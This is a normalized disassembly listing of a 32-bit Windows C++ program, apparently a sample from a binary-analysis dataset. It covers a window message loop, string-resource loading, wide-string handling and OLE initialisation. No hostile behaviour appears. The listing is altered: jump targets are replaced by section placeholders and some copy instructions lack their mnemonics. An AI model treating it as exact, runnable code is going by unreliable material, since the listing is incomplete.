jg r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_416ec0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_416f00
push 0xffffffff
push sub_431598
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
mov eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x4 ]
call sub_416df0
mov [ esp + 0x10 ] 0x0
lea ecx [ esp ]
push ecx
call sub_41d590
mov ecx eax
call sub_41ce10
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x8 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0x10
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esp ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov edx [ ecx ]
push 0x1
call [ edx ]
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_416fa0
mov eax [ esp + 0x18 ]
test eax eax
push ebx
push esi
push edi
mov esi ecx
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn 0x18
mov edi [ esp + 0x14 ]
cmp edi 0x1
mov ebx [ esp + 0x20 ]
jne r-xdata
cmp edi 0x422
jne r-xdata
mov eax [ esi + 0x4 ]
push eax
call sub_418680
mov ecx [ esi + 0x4 ]
add esp 0x4
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
push ecx
call [ SetWindowPos@IAT ]
mov [ ebx ] 0x0
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
push 0x0
push ebx
push eax
push ecx
push edi
push edx
mov ecx esi
call sub_40a4e0
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x20 ]
push edx
push eax
push ecx
push edi
mov ecx esi
call sub_416f00
mov edx [ esp + 0x20 ]
mov [ edx ] eax
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x18
sub_417050
push 0xffffffff
push sub_4315c3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x14 ]
call sub_408660
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call sub_418460
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4170b0
push ebx
push ebp
mov ebp [ IsWindow@IAT ]
push esi
push edi
mov edi [ Sleep@IAT ]
mov ebx ecx
xor esi esi
push 0x3e8
call edi
mov ecx esi
inc esi
cmp ecx 0x5
jl r-xdata
mov eax [ eax + 0x4 ]
push eax
call ebp
test eax eax
jne r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ ebx + 0x64 ]
mov eax [ edx + 0x4 ]
push 0x0
push 0x0
push 0x10
push eax
call [ PostMessageW@IAT ]
pop edi
pop esi
pop ebp
pop ebx
retn
sub_417110
push 0xffffffff
push sub_4315e3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_418410
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x14 ]
mov [ esi ] r--data
call sub_408530
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_417190
push 0xffffffff
push sub_431619
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x88
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
xor ebx ebx
push ebx
mov [ esp + 0x98 ] eax
call [ OleInitialize@IAT ]
push 0x1bc
call sub_42e3bc
add esp 0x4
mov [ esp + 0x10 ] eax
mov [ esp + 0xa0 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
mov ecx eax
call sub_4177c0
jmp r-xdata
lea eax [ esp + 0x5c ]
push eax
call sub_4179d0
mov ecx [ esi + 0x24 ]
push ecx
mov ecx [ esi + 0x64 ]
call sub_417e80
mov ecx [ esi + 0x64 ]
lea edx [ esp + 0x78 ]
push edx
call sub_408ca0
push ebx
call [ time@IAT ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x14 ] eax
xor eax eax
mov al [ rw-data ]
push eax
mov eax [ esi + 0x24 ]
push ecx
push edx
push eax
push ebx
push 0xc
call sub_414860
add esp 0x1c
mov ecx esi
call sub_418320
mov edi [ GetMessageW@IAT ]
push ebx
push ebx
push ebx
lea ecx [ esp + 0x30 ]
push ecx
call edi
test eax eax
je r-xdata
cmp ecx ebx
je r-xdata
mov [ esp + 0xa0 ] 0xffffffff
mov esi [ esp + 0xa8 ]
lea ecx [ esi + 0x48 ]
push ecx
lea ecx [ eax + 0xf4 ]
mov [ esi + 0x64 ] eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
push 0x4
push ebx
lea edx [ esp + 0x48 ]
lea edi [ esi + 0x2c ]
push edx
mov ecx edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::substr@IAT ]
mov [ esp + 0xa0 ] 0x1
lea ecx [ esp + 0x40 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
mov ebp [ _wtoi@IAT ]
push eax
call ebp
add esp 0x4
push eax
push 0x4
lea eax [ esp + 0x80 ]
push eax
mov ecx edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::substr@IAT ]
mov [ esp + 0xa0 ] 0x2
mov ecx [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
mov edx [ ecx ]
push edx
lea ecx [ esp + 0x44 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
call ebp
add esp 0x4
add eax 0x4
push eax
lea eax [ esp + 0x64 ]
push eax
mov ecx edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::substr@IAT ]
mov [ esp + 0xa0 ] 0x3
push ebx
push ecx
mov eax esp
mov [ esp + 0x18 ] esp
mov [ eax ] ebx
mov ecx [ esi + 0x18 ]
mov eax [ esi + 0x14 ]
push 0x88
push 0x94000000
push ebx
push ecx
mov [ esp + 0x34 ] ecx
mov [ esp + 0x38 ] eax
mov eax esp
lea ecx [ esp + 0x2c ]
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ eax ] ecx
mov ecx [ esi + 0x64 ]
mov [ esp + 0x28 ] esp
call sub_409d00
cmp eax ebx
mov ecx [ esi + 0x64 ]
jne r-xdata
mov ecx [ esi + 0x64 ]
mov eax [ ecx + 0x140 ]
cmp eax 0x3
ja r-xdata
mov ebp [ TranslateAcceleratorW@IAT ]
mov [ esp + 0xa0 ] 0x2
lea ecx [ esp + 0x5c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0xa0 ] 0x1
lea ecx [ esp + 0x78 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0xa0 ] 0xffffffff
lea ecx [ esp + 0x40 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x98 ]
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x94 ]
xor eax eax
call sub_42e72f
pop edi
pop esi
pop ebp
pop ebx
add esp 0x94
retn 0x4
mov edx [ ecx ]
push 0x1
call [ edx + 0x4 ]
jmp r-xdata
mov edi 0x1
jmp [ eax * 4 + jump_table_417480 ]
push ebx
push ebx
push ebx
lea eax [ esp + 0x30 ]
push eax
call edi
test eax eax
jne r-xdata
lea ecx [ esp + 0x24 ]
push ecx
call [ TranslateMessage@IAT ]
lea edx [ esp + 0x24 ]
push edx
call [ DispatchMessageW@IAT ]
mov [ esi + 0x64 ] ebx
call [ OleUninitialize@IAT ]
mov ecx esi
call sub_418350
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov edi 0x13
jmp r-xdata
mov edi 0x12
jmp r-xdata
mov edi 0x14
jmp r-xdata
mov edi 0x15
jmp r-xdata
mov eax [ esp + 0x24 ]
lea edx [ esp + 0x24 ]
push edx
push ebx
push eax
call ebp
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
xor edx edx
mov dl [ rw-data ]
push edx
mov edx [ esi + 0x24 ]
push eax
push ecx
push edx
push ebx
call [ time@IAT ]
mov ecx [ esp + 0x24 ]
add esp 0x4
sub eax ecx
push eax
push edi
call sub_414860
mov ecx [ esi + 0x64 ]
add esp 0x18
cmp ecx ebx
je r-xdata
sub_4174b0
push ebx
mov ebx [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
push edi
push ebx
call [ LoadResource@IAT ]
test eax eax
jne r-xdata
push esi
push eax
call [ LockResource@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop ebx
retn
push edi
push ebx
call [ SizeofResource@IAT ]
mov ecx [ esp + 0x18 ]
add eax esi
and ecx 0xf
jbe r-xdata
pop esi
pop edi
xor eax eax
pop ebx
retn
cmp esi eax
jae r-xdata
cmp esi eax
jae r-xdata
mov ax [ esi ]
neg ax
sbb eax eax
and eax esi
pop esi
pop edi
pop ebx
retn
dec ecx
movzx edx [ esi ]
lea esi [ esi + edx * 2 + 0x2 ]
jne r-xdata
sub_417510
push esi
mov esi [ esp + 0xc ]
mov eax esi
shr eax 0x4
push edi
mov edi [ esp + 0xc ]
inc eax
movzx ecx ax
push 0x6
push ecx
push edi
call [ FindResourceW@IAT ]
test eax eax
jne r-xdata
push esi
push eax
push edi
call sub_4174b0
add esp 0xc
pop edi
pop esi
retn
pop edi
pop esi
retn
sub_417550
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
mov ecx esi
push edi
mov edi [ esp + 0xc ]
shr ecx 0x4
inc ecx
push eax
movzx edx cx
push edx
push 0x6
push edi
call [ FindResourceExW@IAT ]
test eax eax
jne r-xdata
push esi
push eax
push edi
call sub_4174b0
add esp 0xc
pop edi
pop esi
retn
pop edi
pop esi
retn
sub_417590
push ebx
push ebp
push esi
push edi
xor edi edi
push edi
mov ecx rw-data
call sub_42df96
mov esi eax
test esi esi
mov ebp 0x1
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov ebx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov ecx ebx
shr ecx 0x4
inc ecx
push eax
movzx edx cx
push edx
push 0x6
push esi
call [ FindResourceExW@IAT ]
test eax eax
je r-xdata
push ebp
mov ecx rw-data
call sub_42df96
mov esi eax
inc ebp
test esi esi
jne r-xdata
push ebx
push eax
push esi
call sub_4174b0
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
test edi edi
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn
sub_417620
push 0xffffffff
push sub_431655
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esp + 0x10 ] 0x1
lea ecx [ esi + 0x144 ]
call sub_419690
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x124 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call sub_416b10
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4176e0
mov ecx [ esp + 0x8 ]
add ecx ecx
push esi
mov esi [ esp + 0x10 ]
mov eax ecx
push edi
mov edi [ esp + 0xc ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_417710
cmp [ ecx ] 0x0
jne r-xdata
xor eax eax
retn
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ ecx + 0xc ]
test eax eax
jne r-xdata
mov eax 0x1
retn
sub_4177c0
push 0xffffffff
push sub_431685
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ esp + 0xc ] esi
call sub_416ac0
xor edi edi
mov [ esp + 0x18 ] edi
lea ecx [ esi + 0x124 ]
mov [ esi ] r--data
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x18 ] 0x1
lea ecx [ esi + 0x144 ]
call sub_419980
mov [ esp + 0x18 ] 0x2
xor eax eax
lea ebx [ esi + 0x114 ]
mov [ ebx ] eax
xor ecx ecx
mov [ ebx + 0x4 ] ecx
xor edx edx
mov [ ebx + 0x8 ] edx
mov [ esi + 0x140 ] edi
mov [ ebx + 0xc ] edi
mov [ esp + 0x18 ] 0xffffffff
mov ecx [ esp + 0x10 ]
pop edi
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_417870
push ebx
mov ebx [ ??$?8_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA_NABV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@PB_W@Z@IAT ]
push esi
push edi
mov edi [ esp + 0x10 ]
push r--data
push edi
mov esi ecx
call ebx
add esp 0x8
test al al
je r-xdata
push r--data
push edi
call ebx
add esp 0x8
test al al
je r-xdata
mov eax [ esi + 0x114 ]
test eax eax
lea edi [ esi + 0x114 ]
jne r-xdata
push r--data
push edi
call ebx
add esp 0x8
test al al
je r-xdata
mov edx [ esi + 0x4 ]
lea ecx [ esi + 0x114 ]
push ecx
push edx
call [ GetWindowRect@IAT ]
mov eax [ esi + 0x4 ]
push eax
call sub_418680
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
retn 0x8
push edi
call [ IsRectEmpty@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
jne r-xdata
push r--data
push edi
call ebx
add esp 0x8
test al al
je r-xdata
mov ecx [ esp + 0x14 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
call [ _wtoi@IAT ]
add esp 0x4
pop edi
mov [ esi + 0x140 ] eax
pop esi
xor eax eax
pop ebx
retn 0x8
mov eax [ esi + 0x4 ]
push 0x0
push eax
call sub_418500
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
retn 0x8
mov eax [ esi + 0x118 ]
mov ecx [ edi ]
mov edx [ esi + 0x4 ]
push 0x15
push 0xffffffff
push 0xffffffff
push eax
push ecx
push 0x0
push edx
call [ SetWindowPos@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
retn 0x8
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
push r--data
push edi
call ebx
add esp 0x8
test al al
je r-xdata
mov ecx [ esi + 0x4 ]
push 0x0
push 0x0
push 0x10
push ecx
call [ PostMessageW@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
retn 0x8
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
push eax
push edi
mov ecx esi
call sub_416d00
pop edi
pop esi
pop ebx
retn 0x8
mov ecx [ esp + 0x14 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
mov edx [ esi + 0x4 ]
push eax
push 0x0
push 0x421
push edx
call [ SendMessageW@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
retn 0x8
sub_4179d0
push 0xffffffff
push sub_431699
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
mov eax [ esp + 0x2c ]
push esi
push eax
mov esi ecx
lea ecx [ esp + 0x8 ]
push r--data
push ecx
call sub_4040a0
add esp 0xc
mov [ esp + 0x28 ] 0x0
push eax
lea ecx [ esi + 0x24 ]
call sub_407160
mov [ esp + 0x28 ] 0xffffffff
lea ecx [ esp + 0x4 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x20 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x28
retn 0x4
sub_417a40
mov edx [ esp + 0x4 ]
test edx edx
push esi
mov esi ecx
je r-xdata
or eax 0xffffffff
pop esi
retn 0x8
mov ecx [ esp + 0xc ]
test ecx ecx
jl r-xdata
mov eax [ esi ]
cmp ecx [ eax - 0xc ]
jg r-xdata
push edx
lea eax [ eax + ecx * 2 ]
push eax
call [ wcsstr@IAT ]
add esp 0x8
test eax eax
je r-xdata
sub eax [ esi ]
sar eax 0x1
pop esi
retn 0x8
sub_417a80
push esi
mov esi ecx
mov ecx [ esi ]
mov edx [ ecx - 0xc ]
test edx edx
lea eax [ ecx - 0x10 ]
push edi
mov edi [ eax ]
je r-xdata
pop edi
pop esi
retn
push ebx
mov ebx [ eax + 0xc ]
lea edx [ eax + 0xc ]
test ebx ebx
pop ebx
jge r-xdata
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov eax [ ecx - 0x8 ]
test eax eax
jge r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0xc ]
add eax 0x10
mov [ esi ] eax
mov ecx [ eax ]
mov edx [ ecx ]
push eax
call [ edx + 0x4 ]
mov [ ecx - 0xc ] 0x0
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
pop esi
retn
push 0x80070057
call sub_401d20
sub_417af0
push ebp
push esi
mov esi [ esp + 0x10 ]
mov eax esi
shr eax 0x4
push edi
mov edi [ esp + 0x10 ]
inc eax
mov ebp ecx
movzx ecx ax
push 0x6
push ecx
push edi
call [ FindResourceW@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebp
retn 0x8
push esi
push eax
push edi
call sub_4174b0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax [ ebp ]
mov ecx [ eax - 0x4 ]
sub eax 0x10
mov eax [ eax + 0x8 ]
push ebx
movzx ebx [ esi ]
mov edx 0x1
sub edx ecx
sub eax ebx
or edx eax
jge r-xdata
mov edi [ ebp ]
lea eax [ ebx + ebx ]
mov ecx eax
mov edx ecx
shr ecx 0x2
add esi 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
test ebx ebx
[ edi ] [ esi ]
jl r-xdata
push ebx
mov ecx ebp
call sub_412a30
push 0x80070057
call sub_401d20
mov ecx [ ebp ]
cmp ebx [ ecx - 0x8 ]
jg r-xdata
mov [ ecx - 0xc ] ebx
mov ecx [ ebp ]
pop ebx
pop edi
pop esi
mov [ eax + ecx ] 0x0
mov eax 0x1
pop ebp
retn 0x8
sub_417ba0
push ecx
push ebp
mov ebp [ esp + 0x10 ]
test ebp ebp
push esi
mov esi ecx
mov [ esp + 0x8 ] esi
jne r-xdata
mov edx [ esp + 0x10 ]
test edx edx
jne r-xdata
call sub_417a80
pop esi
pop ebp
pop ecx
retn 0x8
mov eax [ esi ]
push ebx
mov ebx edx
sub ebx eax
mov ecx 0x1
sub ecx [ eax - 0x4 ]
push edi
mov edi [ eax - 0xc ]
mov eax [ eax - 0x8 ]
sub eax ebp
sar ebx 0x1
or ecx eax
jge r-xdata
push 0x80070057
call sub_401d20
cmp ebx edi
mov eax [ esi ]
ja r-xdata
push ebp
mov ecx esi
call sub_412a30
mov edx [ esp + 0x18 ]
lea ecx [ ebp + ebp ]
mov [ esp + 0x18 ] ecx
mov esi edx
mov edx ecx
shr ecx 0x2
mov edi eax
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x10 ]
mov edi edx
lea edi [ ebp + ebp ]
push edi
lea ecx [ eax + ebx * 2 ]
push ecx
push eax
call [ memmove@IAT ]
add esp 0xc
jmp r-xdata
push 0x80070057
call sub_401d20
mov eax [ esi ]
cmp ebp [ eax - 0x8 ]
jg r-xdata
test ebp ebp
jl r-xdata
mov [ eax - 0xc ] ebp
mov eax [ esi ]
mov [ edi + eax ] 0x0
pop edi
pop ebx
pop esi
pop ebp
pop ecx
retn 0x8
sub_417c60
push esi
push edi
mov edi [ esp + 0xc ]
push 0x0
push edi
mov esi ecx
call sub_417590
add esp 0x8
test eax eax
jne r-xdata
push edi
push eax
mov ecx esi
call sub_417af0
pop edi
pop esi
retn 0x4
pop edi
pop esi
retn 0x4
sub_417c90
push edi
mov edi ecx
mov ecx [ esp + 0x8 ]
xor al al
test ecx ecx
je r-xdata
pop edi
retn 0x4
test ecx 0xffff0000
jne r-xdata
push esi
movzx esi cx
push 0x0
push esi
call sub_417590
add esp 0x8
test eax eax
je r-xdata
mov al 0x1
pop esi
push esi
push eax
mov ecx edi
call sub_417af0
sub_417cd0
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
mov edi ecx
jne r-xdata
push esi
call [ wcslen@IAT ]
add esp 0x4
push eax
push esi
mov ecx edi
call sub_417ba0
pop edi
pop esi
retn 0x4
xor eax eax
push eax
push esi
call sub_417ba0
pop edi
pop esi
retn 0x4
sub_417d10
push esi
push edi
mov edi [ esp + 0xc ]
test edi edi
mov esi ecx
jne r-xdata
push edi
call [ wcslen@IAT ]
add esp 0x4
push eax
push edi
mov ecx esi
call sub_417ba0
pop edi
mov eax esi
pop esi
retn 0x4
xor eax eax
push eax
push edi
call sub_417ba0
pop edi
mov eax esi
pop esi
retn 0x4
sub_417d50
push 0xffffffff
push sub_4316dc
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
mov eax [ rw-data ]
push esi
mov esi ecx
mov [ esp + 0x58 ] eax
mov eax [ esi + 0x174 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x5c ]
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x58 ]
xor eax eax
pop esi
call sub_42e72f
add esp 0x64
retn 0x10
mov eax [ esp + 0x74 ]
push eax
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x64 ] 0x0
lea ecx [ esp + 0x4 ]
push ecx
lea ecx [ esi + 0x144 ]
call sub_419360
push eax
lea ecx [ esp + 0x40 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x64 ] 0x2
lea ecx [ esp + 0x4 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
lea ecx [ esp + 0x74 ]
call sub_412af0
mov [ esp + 0x64 ] 0x3
lea ecx [ esp + 0x3c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
lea edx [ esp + 0x78 ]
push r--data
push edx
call sub_412ce0
mov eax [ esp + 0x80 ]
add esp 0xc
push eax
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x64 ] 0x4
lea ecx [ esp + 0x4 ]
push ecx
lea edx [ esp + 0x24 ]
push edx
lea ecx [ esi + 0x24 ]
call sub_407380
mov [ esp + 0x64 ] 0x4
lea ecx [ esp + 0x20 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x64 ] 0x3
lea ecx [ esp + 0x4 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x64 ] 0x2
lea ecx [ esp + 0x74 ]
call sub_412b40
mov [ esp + 0x64 ] 0xffffffff
lea ecx [ esp + 0x3c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_417e80
push 0xffffffff
push sub_431711
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov eax [ rw-data ]
push esi
mov esi ecx
push edi
mov ecx rw-data
call [ eax + 0xc ]
add eax 0x10
mov [ esp + 0x8 ] eax
mov [ esp + 0x30 ] 0x1
mov ecx [ esp + 0x38 ]
push ecx
lea edx [ esp + 0xc ]
push r--data
push edx
call sub_412ce0
mov edi [ esp + 0x14 ]
add esp 0xc
push edi
lea ecx [ esp + 0x10 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x30 ] 0x2
lea eax [ esp + 0xc ]
push eax
lea ecx [ esi + 0x24 ]
call sub_407160
mov [ esp + 0x30 ] 0x1
lea ecx [ esp + 0xc ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x30 ] 0xffffffff
lea eax [ edi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
pop edi
pop esi
jg r-xdata
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn 0x4
mov ecx [ eax ]
mov edx [ ecx ]
push eax
call [ edx + 0x4 ]
sub_417f40
push esi
push edi
mov edi [ esp + 0xc ]
test edi edi
mov esi ecx
jne r-xdata
push edi
call [ wcslen@IAT ]
add esp 0x4
push eax
push edi
mov ecx esi
call sub_417ba0
pop edi
mov eax esi
pop esi
retn 0x4
xor eax eax
push eax
push edi
call sub_417ba0
pop edi
mov eax esi
pop esi
retn 0x4
sub_417f80
mov eax [ esp + 0x18 ]
test eax eax
push ebx
push edi
mov ebx ecx
jne r-xdata
pop edi
xor eax eax
pop ebx
retn 0x18
mov edi [ esp + 0x10 ]
cmp edi 0x421
jne r-xdata
cmp edi 0x1
push esi
mov esi [ esp + 0x20 ]
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
push eax
push ecx
push edx
push edi
mov ecx ebx
call sub_417d50
mov ecx [ esp + 0x1c ]
mov [ ecx ] eax
cmp edi 0x10
jne r-xdata
lea ecx [ ebx + 0x144 ]
call sub_41a660
jmp r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x10 ]
push 0x0
push esi
push edx
push eax
push edi
push ecx
mov ecx ebx
call sub_416fa0
test eax eax
pop esi
jne r-xdata
mov [ esi ] 0x0
pop edi
mov eax 0x1
pop ebx
retn 0x18
sub_418010
push 0xffffffff
push sub_431728
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ rw-data ]
push esi
mov esi ecx
push edi
mov ecx rw-data
mov [ esp + 0x8 ] esi
call [ eax + 0xc ]
add eax 0x10
mov [ esi ] eax
mov [ esp + 0x14 ] 0x0
mov edi [ esp + 0x1c ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
test edi 0xffff0000
jne r-xdata
push eax
push edi
mov ecx esi
call sub_417ba0
push edi
call [ wcslen@IAT ]
add esp 0x4
movzx edi di
push 0x0
